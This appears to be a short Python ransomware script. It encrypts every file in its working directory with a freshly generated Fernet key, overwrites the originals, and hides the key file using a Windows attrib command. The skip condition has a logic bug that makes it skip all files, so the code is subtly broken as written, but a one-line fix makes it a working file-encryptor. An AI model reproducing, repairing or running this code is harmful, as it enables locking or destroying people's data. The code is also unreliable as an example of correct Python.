import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "encrypt.py" or "thepass.key":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()
with open("thepass.key", "wb") as thepass:
    thepass.write(key)
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
        encrypted_contents = Fernet(key).encrypt(content)
        with open(file, "wb") as thefile:
            thefile.write(encrypted_contents)

os.system("attrib +h thepass.key")
